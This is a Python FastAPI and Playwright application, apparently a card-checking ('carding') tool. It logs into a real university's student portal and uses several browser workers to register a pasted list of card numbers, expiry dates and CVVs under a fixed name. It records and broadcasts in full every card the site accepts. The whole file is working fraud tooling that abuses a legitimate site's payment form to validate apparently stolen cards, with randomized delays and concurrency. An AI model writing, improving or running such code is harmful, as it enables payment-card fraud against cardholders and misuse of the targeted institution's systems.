import asyncio
import os
import random
from contextlib import asynccontextmanager
from pathlib import Path

import uvicorn
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse
from pydantic import BaseModel

from playwright.async_api import async_playwright

# ===================== CONFIG =====================
URL_LOGIN = "https://digital.unimar.br/login"
URL_MEUS_CARTOES = "https://digital.unimar.br/areadoaluno/conta/meuscartoes"

EMAIL = os.getenv("UNIMAR_EMAIL")
SENHA = os.getenv("UNIMAR_SENHA")
NOME_FIXO = "Bruna Mendes"

# ===================== ESTADO =====================
estado = {
    "rodando": False,
    "clients": set(),
    "total_cartoes": 0,
    "processados": 0,
    "aprovados": 0,
}

def log(mensagem: str):
    print(f"[LOG] {mensagem}")
    asyncio.create_task(broadcast("log", {"mensagem": mensagem}))

async def broadcast(type: str, data: dict = None):
    if data is None:
        data = {}
    message = {"type": type, **data}
    for client in list(estado["clients"]):
        try:
            await client.send_json(message)
        except:
            estado["clients"].discard(client)

# ===================== LIFESPAN =====================
@asynccontextmanager
async def lifespan(app: FastAPI):
    Path("aprovados.txt").touch(exist_ok=True)
    yield

app = FastAPI(title="Unimar Card Tester", lifespan=lifespan)

# ===================== WEBSOCKET =====================
@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    estado["clients"].add(websocket)
    try:
        while True:
            await asyncio.sleep(10)
    except WebSocketDisconnect:
        estado["clients"].discard(websocket)

# ===================== PLAYWRIGHT =====================
async def login_mestre(playwright):
    try:
        log("[Autenticação] Iniciando login mestre...")
        browser = await playwright.chromium.launch(
            headless=True,
            args=[
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-dev-shm-usage",
                "--disable-gpu",
                "--disable-extensions",
                "--disable-background-networking",
                "--disable-background-timer-throttling",
                "--disable-backgrounding-occluded-windows",
                "--disable-renderer-backgrounding",
                "--disable-client-side-phishing-detection",
                "--disable-component-update",
                "--disable-default-apps",
                "--disable-features=Translate,OptimizationHints,MediaRouter",
                "--no-first-run",
                "--disable-sync"
            ]
        )
        context = await browser.new_context()
        page = await context.new_page()

        await page.goto(URL_LOGIN, wait_until="networkidle", timeout=60000)
        await page.get_by_role("textbox", name="E-mail ou CPF").fill(EMAIL)
        await page.get_by_role("textbox", name="Senha").fill(SENHA)
        await page.get_by_role("button", name="Entrar").click()

        await page.wait_for_selector("text=Meus Cartões", timeout=30000)
        await context.storage_state(path="sessao_unimar.json")

        await context.close()
        await browser.close()
        log("[Autenticação] Login realizado com sucesso!")
        return True
    except Exception as e:
        log(f"[ERRO] Login falhou: {e}")
        return False


async def worker(id_worker: int, browser, fila: asyncio.Queue):
    context = await browser.new_context(storage_state="sessao_unimar.json")
    page = await context.new_page()
    await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")

    try:
        while not fila.empty() and estado["rodando"]:
            idx, linha, _ = await fila.get()
            try:
                numero, mes, ano, cvv = [x.strip() for x in linha.split("|")]
                log(f"[Canal {id_worker}] Processando #{idx} → {numero[-4:]}")

                await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
                await asyncio.sleep(random.uniform(0.8, 1.8))

                await page.get_by_role("button", name="Adicionar Cartão de Crédito").click(force=True)

                await page.get_by_role("textbox", name="Número do cartão").fill(numero)
                await page.get_by_role("textbox", name="Nome impresso no cartão").fill(NOME_FIXO)
                await page.get_by_label("Mês").select_option(mes)
                await page.get_by_label("Ano").select_option(ano)
                await page.get_by_role("textbox", name="CVV").fill(cvv)

                botoes_antes = await page.get_by_role("button", name="Remover").count()
                await page.get_by_role("button", name="Registrar Cartão de Crédito").click(force=True)

                for _ in range(25):
                    if not estado["rodando"]: break
                    if await page.get_by_role("button", name="Remover").count() > botoes_antes:
                        log(f"[Canal {id_worker}] ✅ APROVADO: {numero[-4:]}")
                        await broadcast("aprovado", {"cartao": f"{numero}|{mes}|{ano}|{cvv}"})
                        estado["aprovados"] += 1
                        break

                    body = (await page.locator("body").inner_text()).lower()
                    if any(x in body for x in ["inválida", "recusado", "erro"]):
                        log(f"[Canal {id_worker}] ❌ Reprovado: {numero[-4:]}")
                        break
                    await asyncio.sleep(1.2)
            except Exception as e:
                log(f"[Erro] Item #{idx}: {e}")
            finally:
                estado["processados"] += 1
                fila.task_done()
    finally:
        await context.close()


async def processar_cartoes(texto_cartoes: str, num_canais: int):
    try:
        linhas = [l.strip() for l in texto_cartoes.splitlines() if l.strip()]
        linhas = list(dict.fromkeys(linhas))

        estado["total_cartoes"] = len(linhas)
        estado["processados"] = 0
        estado["aprovados"] = 0

        fila = asyncio.Queue()
        for idx, linha in enumerate(linhas, 1):
            await fila.put((idx, linha, 1))

        async with async_playwright() as pw:
            if not await login_mestre(pw):
                return

            browser = await pw.chromium.launch(
                headless=True,
                args=[
                    "--no-sandbox",
                    "--disable-setuid-sandbox",
                    "--disable-dev-shm-usage",
                    "--disable-gpu"
                ]
            )
            tasks = [asyncio.create_task(worker(i, browser, fila)) for i in range(1, num_canais + 1)]
            await asyncio.gather(*tasks, return_exceptions=True)

            await browser.close()

    except Exception as e:
        log(f"[ERRO CRÍTICO] {e}")
    finally:
        estado["rodando"] = False
        await broadcast("status", {"rodando": False})
        log("[Sistema] Processamento finalizado.")


# ===================== ROTAS =====================
class IniciarRequest(BaseModel):
    lista: str
    canais: int = 4

@app.post("/api/iniciar")
async def iniciar(data: IniciarRequest):
    if estado["rodando"]:
        return {"status": "já_em_execucao"}
    
    estado["rodando"] = True
    await broadcast("status", {"rodando": True})
    asyncio.create_task(processar_cartoes(data.lista, data.canais))
    return {"status": "iniciado"}

@app.post("/api/parar")
async def parar():
    estado["rodando"] = False
    log("⛔ Teste interrompido pelo usuário.")
    await broadcast("status", {"rodando": False})
    return {"status": "parando"}

@app.get("/", response_class=HTMLResponse)
async def index():
    with open("templates/index.html", encoding="utf-8") as f:
        return f.read()

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=5000)
